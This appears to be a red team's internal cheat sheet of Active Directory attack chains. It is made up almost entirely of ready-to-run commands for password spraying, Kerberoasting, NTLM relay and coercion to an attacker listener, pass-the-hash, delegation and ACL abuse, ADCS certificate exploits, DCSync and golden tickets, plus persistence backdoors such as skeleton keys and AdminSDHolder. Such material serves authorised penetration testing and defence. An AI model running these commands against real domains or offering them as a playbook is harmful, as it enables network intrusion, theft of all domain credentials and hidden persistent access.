# Active Directory Attack Chains

## Table of Contents
1. [Recon (no creds / with creds)](#recon)
2. [Password Attacks](#passwords)
3. [Kerberoast & ASREPRoast](#roast)
4. [NTLM Relay & Coercion](#relay)
5. [Lateral: PtH / PtT / OverPtH](#lateral)
6. [Delegation attacks (Unconstrained/Constrained/RBCD)](#delegation)
7. [ACL/ACE Abuse](#acl)
8. [ADCS Certificate attacks (ESC1-16)](#adcs)
9. [LAPS](#laps)
10. [Privileged Groups & misc privesc](#groups)
11. [DA → Forest: DCSync, Golden/Silver/Diamond, Trusts](#da)
12. [MSSQL / Printers / SCCM / Lansweeper](#misc)
13. [Persistence](#persist)
14. [Linux AD join](#linuxad)

<a name="recon"></a>
## 1. Recon

**No creds:** SMB null/guest (`enum4linux -a -u "" -p ""`), LDAP anonymous (`nmap --script ldap*`), DNS zone enum (`gobuster dns` / `adidnsdump`), Kerberos user enum (`kerbrute userenum`, `nmap krb5-enum-users`), Responder poisoning, OSINT username patterns.

**With creds:**
```bash
# BloodHound collection
# SharpHound.exe (Windows) / bloodhound.py -d domain -c All -ns <dc> (Linux)
# Analyze paths to DA

# PowerView (Windows):
Get-DomainUser -SPN; Get-DomainUser -PreauthNotRequired
Get-DomainComputer -Unconstrained; Get-DomainUser/Computer -TrustedToAuth
Get-DomainObjectAcl -Identity <target> | ? {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|GenericWrite'}
Get-DomainTrust; Get-DomainForeignGroupMember
Get-DomainGPOUserLocalGroupMapping

# Linux tooling:
nxc/cme ldap <DC> -u user -p pass (we don't have nxc; use impacket)
GetADUsers.py -dc-ip <DC> domain/user:pass -all
lookupsid.py domain/user:pass@DC            # RID cycling
GetUserSPNs.py -request -dc-ip <DC> domain/user
ldapsearch -x -H ldap://DC -D 'user@domain' -w pass -b 'dc=domain,dc=local'
bloodyAD / windapsearch / adidnsdump
```

<a name="passwords"></a>
## 2. Password Attacks

```bash
# Spraying (respect lockout! check policy first)
Get-DomainPolicy | select -expand SystemAccess     # LockoutThreshold
crackmapexec smb DC -u users.txt -p 'Winter2025!' --continue-on-success   (we lack cme → loop impacket)
kerbrute passwordspray -d domain users.txt 'pass'
# hydra -L users.txt -p pass ldap2://DC
# OWA: MailSniper Invoke-PasswordSprayOWA
# Kerbrute brute per-user carefully
```

<a name="roast"></a>
## 3. Kerberoast & ASREPRoast

```bash
# Kerberoast (any domain user can request TGS for SPN accounts)
GetUserSPNs.py -request -dc-ip <DC> domain/user:pass -outputfile roast.txt
# crack: hashcat -m 13100 (RC4 etype23) or -m 19600/19700 (AES)
# Rubeus kerberoast /aes /nowrap (Windows)
# Persistence: Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/NOTHING'}

# ASREPRoast (users without preauth)
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -dc-ip <DC> -no-pass
GetNPUsers.py domain/user:pass -request -format hashcat -dc-ip <DC>
# crack: hashcat -m 18200
# Persistence: Set-DomainObject -Identity victim -XOR @{UserAccountControl=4194304}
```

<a name="relay"></a>
## 4. NTLM Relay & Coercion

```bash
# Find targets with SMB signing disabled:
crackmapexec smb subnet.txt --gen-relay-list no_signing.txt   (or nxc)
# ntlmrelayx.py -tf targets.txt -smb2support [--dump-sam|--dump-laps|--shadow-credentials]
# ntlmrelayx.py -t ldaps://DC --add-computer NEWPC$    (if machine creation allowed)
# Responder: responder -I eth0 -wrf (capture NetNTLMv2 → crack -m 5600)

# Coerce auth from DC/hosts → relay:
printerbug.py domain/user:pass@TARGET <attacker_ip>       # spooler
PetitPotam.py -d domain -u user -p pass <attacker_ip> <DC>  # EfsRpc (patched, but try)
DFSCoerce / Coercer (coercer coerce -t TARGET -l LISTENER)
SpoolSample.exe TARGET ATTACKER (Windows)
# Combine with Unconstrained Delegation host to capture TGTs
```

<a name="lateral"></a>
## 5. Lateral with NTLM/Kerberos

```bash
# Pass-the-Hash (impacket)
psexec.py -hashes LM:NT domain/user@target cmd.exe
wmiexec.py / smbexec.py / atexec.py / dcomexec.py  (-hashes)
secretsdump.py -hashes :NT domain/user@target
crackmapexec smb subnet -u user -H nt.txt --local-auth
# mimikatz: sekurlsa::pth /user:u /domain:d /ntlm:hash /run:cmd

# Over-Pass-the-Hash (get TGT from hash, for Kerberos-only networks)
mimikatz "sekurlsa::pth /user:u /domain:d /aes256:key /run:cmd"
Rubeus.exe asktgt /user:u /rc4:hash /domain:d /ptt

# Pass-the-Ticket
mimikatz "sekurlsa::tickets /export"  →  kerberos::ptt ticket.kirbi
export KRB5CCNAME=ticket.ccache; klist; psexec.py -k -no-pass domain/user@target
```
Full technique matrix in lateral.md.

<a name="delegation"></a>
## 6. Delegation

**Unconstrained** (`Get-DomainComputer -Unconstrained`): if you control that host, coerce DC to auth → steal its TGT → DCSync. `Rubeus.exe monitor /interval:5 /filteruser:DC$` + printerbug.

**Constrained** (`msDS-AllowedToDelegateTo`):
```bash
Rubeus.exe s4u /user:svc$ /rc4:hash /impersonateuser:administrator /msdsspn:CIFS/dc.domain /altservice:ldap /ptt
# impacket: getST.py -spn CIFS/dc -impersonate administrator domain/svc$:pass -dc-ip DC
```

**RBCD** (write msDS-AllowedToActOnBehalfOfOtherIdentity on target):
```bash
# Need: GenericWrite/WriteDACL on computer object + ability to create machine account (or existing controlled acct)
addcomputer.py -computer-name EVIL$ -computer-pass 'Passw0rd!' domain/user:pass -dc-ip DC
python3 rbcd.py -t TARGET$ -f EVIL$ -dc-ip DC domain/user:pass   # or PowerView Set-DomainObject
getST.py -spn cifs/TARGET -impersonate administrator domain/EVIL\$:Passw0rd! -dc-ip DC
export KRB5CCNAME=administrator.ccache; secretsdump.py -k -no-pass administrator@TARGET
# KrbRelayUp for local SYSTEM on domain machines (LDAP no-signing)
```

<a name="acl"></a>
## 7. ACL/ACE Abuse

From BloodHound/PowerView `Get-DomainObjectAcl`:
| Right | Abuse |
|---|---|
| GenericAll on user | Reset password: `net rpc password user newpass -U ...`, or set SPN→kerberoast, or ASREP-enable |
| GenericAll on group | `net group "Domain Admins" me /add /domain` |
| GenericWrite on user | Set scriptPath / SPN |
| WriteDACL | Add-DomainObjectAcl → then GenericAll; add DCSync ACE |
| WriteOwner | Set-DomainObjectOwner → WriteDACL → ... |
| ForceChangePassword | Set-DomainUserPassword |
| Self (self-membership) | Add self to group |
| Shadow Credentials | Write msDS-KeyCredentialLink (needs ADCS) → pkinit → TGT (pywhisker/Certipy) |
| LAPS read (ms-Mcs-AdmPwd / msLAPS-Password) | Read local admin pwd |
| AddMembers/AllExtendedRights | group add |

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=dom,DC=local" -PrincipalIdentity me -Rights DCSync
```

<a name="adcs"></a>
## 8. ADCS Certificate Attacks (ESC1-16)

```bash
certipy find -u user@dom -p pass -dc-ip DC -stdout -vulnerable    # certipy (default toolchain)
Certify.exe find /vulnerable                                        # Windows
```
| ESC | Condition | Exploit |
|---|---|---|
| ESC1 | template: ENROLLEE_SUPPLIES_SUBJECT + client auth EKU + low-priv enroll | `certipy req -u user -p pass -ca CA -template T -upn administrator@dom` → `certipy auth -pfx administrator.pfx -dc-ip DC` |
| ESC2 | Any purpose EKU → chain with enrollment agent | similar |
| ESC3 | Enrollment agent template | request agent cert → `-on-behalf-of administrator` |
| ESC4 | template ACL writable | `certipy template -config ...` rewrite to ESC1, restore after |
| ESC5 | PKI object (CN=Configuration) ACL | compromise CA objects |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | any template + SAN |
| ESC7 | CA admin/manage rights | add self as officer, approve pending requests, enable SubCA |
| ESC8 | HTTP enrollment endpoint, no NTLM relay protection | `certipy relay -ca http://CA -template T`; ntlmrelayx to /certsrv |
| ESC9 | CT_FLAG_NO_SECURITY_EXTENSION | `certipy shadow auto` + account update UPN |
| ESC10 | weak mappings (UPN→user, DNS→computer) | account update + req |
| ESC11 | RPC (ICPR) no encryption enforced | `certipy relay -target rpc://CA` |
| ESC13 | OID→group link | req template granting group |
| ESC14/15/16 | renewal / EKUwu CVE-2024-49019 / security ext disabled | per-certipy docs |

Auth with cert: `certipy auth -pfx administrator.pfx -dc-ip DC` (or `-ldap-shell`, `-dc-ip` + schannel). Rubeus asktgt /certificate.
**Golden Certificate**: compromise CA cert (`certipy ca -backup`) → forge certs for anyone (`certipy forge`).

<a name="laps"></a>
## 9. LAPS

```powershell
Get-ADObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(ms-Mcs-AdmPwdExpirationTime=*))' -Properties msLAPS-Password, ms-Mcs-AdmPwd | select Name, msLAPS-Password, ms-Mcs-AdmPwd
Get-LapsADPassword -Identity PC$ -AsPlainText
Get-AdmPwdPassword -ComputerName PC
Find-AdmPwdExtendedRights -Identity 'OU=Workstations'   # who can read
```
```bash
# Linux: nxc ldap -M laps; bloodyAD get object PC$ -attr msLAPS-Password
# Windows LAPS password is JSON {"n":"Administrator","t":"...","p":"..."} → p = password
# Persistence: push ms-mcs-admpwdexpirationtime into future (needs SYSTEM on box)
```

<a name="groups"></a>
## 10. Privileged Groups & misc privesc

- **AdminSDHolder** backdoor: Add-DomainObjectAcl on CN=AdminSDHolder (propagates to priv groups via SDProp).
- **Account Operators**: control DC machine accounts → RBCD to DC.
- **Server/Print Operators**: sc on DC / load driver.
- **Backup Operators**: SeBackup → read NTDS via robocopy /b + diskshadow.
- **DnsAdmins**: dnscmd /config /serverlevelplugindll evil.dll → sc stop/start dns (SYSTEM on DC).
- **Exchange Windows Permissions** → WriteDACL on domain → DCSync.
- **Group Policy Creator Owners** → SharpGPOAbuse immediate task.
- **Hyper-V Admins** → Mount-VHD DC disk.
- **DSRM** (DC local admin): mimikatz lsadump::sam on DC; `sekurlsa::pth /domain:DC-NAME /user:Administrator /ntlm:...` after `DsrmAdminLogonBehavior=2`.
- PrintNightmare (LPE on DCs too), NoPac (sAMAccountName), TimeRoasting (NTP machine hash -m 31300).

<a name="da"></a>
## 11. DA → Forest

```bash
# DCSync (dump whole domain incl. krbtgt)
secretsdump.py -just-dc-ntlm domain/da@DC
# Golden Ticket (krbtgt)
ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain dom Administrator -extra-sid <parent-519>
Rubeus.exe golden /rc4:krbtgt /domain:dom /sid:SID /user:Administrator /groups:512 /ptt /nowrap
# Silver Ticket (service account hash → forge TGS for CIFS/HOST/LDAP)
mimikatz kerberos::golden /domain:d /sid:SID /target:srv /service:cifs /rc4:srv$ /user:x /ptt
# Diamond Ticket (Rubeus diamond /tgtdeleg /krbkey:AES) — stealthier than golden
# Inter-realm / trusts:
Get-DomainTrust -Mapping; nltest /domain_trusts
# child→parent: SID history injection with krbtgt + extra-sid parent-519 (raiseChild.py)
# forest trust keys: mimikatz lsadump::trust /patch → trust ticket
```
**Post-DA**: ntds.dit full dump, GPO deployment, SCCM, golden gMSA (KDS root key from Config NC), DCShadow (`lsadump::dcshadow /object:user /attribute:primaryGroupID /value:512` + /push), BadSuccessor dMSA.

<a name="misc"></a>
## 12. MSSQL / Printers / SCCM / Lansweeper

- **MSSQL**: mssqlclient.py; `EXEC xp_cmdshell`; links crawl (`select * from openquery(link,'...')`, `Get-SQLServerLinkCrawl`), xp_dirtree NTLM capture, mssqlpwner.
- **Printers**: SNMP default community → config; printer web UIs leak creds (Lansweeper-style).
- **SCCM**: MP relay to SQL → OSD policy secrets (pxethief); SharpSCCM.
- **Lansweeper**: honeypot sshesame harvesting; LansweeperDecrypt.ps1 for stored scan creds.
- **AD DNS**: adidnsdump, Invoke-DNSUpdate/dnsupdate.py for spoofing (relay/privesc).

<a name="persist"></a>
## 13. Persistence (authorized only)

- Skeleton key: `misc::skeleton` (mimikatz, DC LSASS).
- Custom SSP: mimilib.dll (Security Packages reg key) or misc::memssp.
- DCSync ACE, AdminSDHolder ACE, ACL persistence, certificates (certipy shadow/auto), LAPS expiration, golden/silver/diamond tickets, DCShadow attributes, GPO scheduled task.
- Linux AD: keytab/ccache reuse.
**Always document removal steps.**

<a name="linuxad"></a>
## 14. Linux AD Join

```bash
# find: /etc/krb5.keytab, /var/lib/sss (sssd), /tmp krb5cc_*
klist -k -t -e /etc/krb5.keytab
keytabextract.py krb5.keytab            # NTLM (etype23) → nxc smb -H
export KRB5CCNAME=/tmp/krb5cc_<uid>     # reuse FILE ccache
tickey -i                                # extract from keyring
# SSSD KCM: SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
kinit -k -t /etc/krb5.keytab 'host/pc@DOMAIN'; klist
# then bloodyAD/pywhisker/nxc with -k
```

## Key tool paths (team)
impacket examples in /usr/share/doc/python3-impacket/examples/, symlinked to /usr/local/bin/:
psexec.py wmiexec.py smbexec.py atexec.py dcomexec.py secretsdump.py GetUserSPNs.py GetNPUsers.py
getTGT.py getST.py ticketer.py raiseChild.py addcomputer.py lookupsid.py samrdump.py rpcdump.py
ntlmrelayx.py mssqlclient.py printerbug.py (impacket). hydra/john/hashcat available.
